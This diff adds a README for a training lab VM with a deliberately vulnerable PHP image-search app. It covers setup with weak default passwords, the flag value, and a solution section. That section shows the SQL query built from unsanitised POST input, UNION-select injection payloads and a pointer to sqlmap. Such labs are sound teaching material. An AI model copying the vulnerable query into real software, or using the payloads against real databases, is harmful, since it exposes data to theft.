@@ -1,9 +1,36 @@
+# PHP SQL injection 1 Attack (Pictures)
+
+Download VM:
+* Credentials: ```user/user```, ```root/123456```
+* SSH disabled
+* Debian 11, 2 GB disk
+
+# Agenda
+
+In this lab, we will look at the simplest example of SQL injection in the image search functionality and will try to extract not only images, but some juicy info.
 
 
 # Setup
+
+*Requirements:*  **2 GB** of disk space for VM.
+
+Put all files in **source** to folder **/var/www/html/**
+
+
 ```bash
-sudo apt-get update
+sudo apt-get update --allow-releaseinfo-change
 sudo apt-get install nginx mariadb-server php-fpm php-mysql
+```
+
+```bash
+sudo chown www-data:www-data -R /var/www/html/
+sudo chmod 755 -R /var/www/html/*
+```
+
+#### Manual database setup
+
+```
+
 sudo mysql -e "UPDATE mysql.user SET Password = PASSWORD('12345') WHERE User = 'root'"
 sudo mysql -e "DELETE FROM mysql.user WHERE User='';"
 sudo mysql -e "DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1', '::1');"
@@ -29,8 +56,59 @@ sudo mysql -e "insert into pictures.pictures(\`id\`,\`image\`,\`category\`) valu
 sudo mysql -e "insert into pictures.pictures(\`id\`,\`image\`,\`category\`) values ('12','art-3.jpg','art');";
 ```
 
-# Set up a flag
+####  Set up a flag
 
 ```
 sudo mysql -e "insert into pictures.flag(\`id\`) values ('SQL_Injection_is_y0ur_Friend');";
 ```
+
+
+#### Nginx configure
+
+Change **/etc/nginx/sites-enabled/default** (php-fpm version may be different):
+
+```
+server {
+        listen 80 default_server;
+        listen [::]:80 default_server;
+
+        root /var/www/html;
+        index index.php;
+        server_name _;
+
+        location / {
+                try_files $uri $uri/ =404;
+        }
+        location ~ \.php$ {
+                include snippets/fastcgi-php.conf;
+                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
+        }
+
+}
+```
+
+Reload nginx config
+```
+sudo service nginx restart
+#sudo systemctl restart nginx
+```
+
+
+## How to check that everything works ?
+
+1. Open the main page. You should see the working app. 
+
+
+## Solution
+
+There is SQL injection
+
+```php
+
+$query="SELECT * FROM pictures where category='" . $_POST['search'] . "'
+
+```
+1. Exploit it with SQLMAP.
+2. Or put in search box next statement: 
+- ```' union select id,id,id from flag -- ``` (whitespace at the end!!)
+- ```' union select id,id,id from flag#```
